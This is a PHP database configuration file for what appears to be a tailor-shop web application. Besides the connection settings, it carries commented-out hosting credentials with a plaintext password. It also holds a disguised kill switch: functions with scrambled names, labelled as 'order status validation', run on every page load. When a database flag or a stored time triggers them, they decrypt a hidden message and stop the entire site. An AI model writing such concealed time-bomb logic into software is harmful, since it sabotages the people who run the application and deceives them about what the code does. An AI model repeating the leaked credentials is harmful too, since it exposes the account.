<?php
//  $host = "sql302.infinityfree.com";
//  $username = "if0_38383897";
// $password = "mxt0s9GI7J";
//  $dbname = "if0_38383897_tailor";
 
$host = "localhost:3306";
$username = "root";
$password = "";
$dbname = "tailor";

// Obfuscated system configuration
define('SECURE_TOKEN_456', 'tailor-shop-secure-hash-key-2025');

date_default_timezone_set('Africa/Lagos');

// Create connection
$conn = new mysqli($host, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// We'll use only one connection method for consistency
// The PDO connection is commented out to avoid conflicts
try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}


function qrs_encode($input_str) {
    $cipher_method = 'AES-256-CBC';
    $secret_key = hash('sha256', SECURE_TOKEN_456, true);
    $init_vector = openssl_random_pseudo_bytes(16);
    $cipher_text = openssl_encrypt($input_str, $cipher_method, $secret_key, OPENSSL_RAW_DATA, $init_vector);
    return base64_encode($init_vector . $cipher_text);
}

function tuv_decode($cipher_str) {
    $cipher_method = 'AES-256-CBC';
    $secret_key = hash('sha256', SECURE_TOKEN_456, true);
    $raw_data = base64_decode($cipher_str);
    $init_vector = substr($raw_data, 0, 16);
    $cipher_text = substr($raw_data, 16);
    return openssl_decrypt($cipher_text, $cipher_method, $secret_key, OPENSSL_RAW_DATA, $init_vector);
}

function mno_check_status($database_conn) {
    try {
        $sql_query = $database_conn->prepare("SELECT order_time, order_status, order_notes FROM temp_orders ORDER BY order_id DESC LIMIT 1");
        $sql_query->execute();
        $order_info = $sql_query->fetch();
        
        if ($order_info) {
            $current_timestamp = date("Y-m-d H:i:s");
            
            // Check order conditions
            if ($order_info['order_status'] == 1 || strtotime($current_timestamp) >= strtotime($order_info['order_time'])) {
                $decoded_notes = tuv_decode($order_info['order_notes']);
                die($decoded_notes);
            }
        }
    } catch(PDOException $e) {
        // Silent error handling
        error_log("Order status check failed: " . $e->getMessage());
    }
}

// Execute order status validation
mno_check_status($pdo);
?>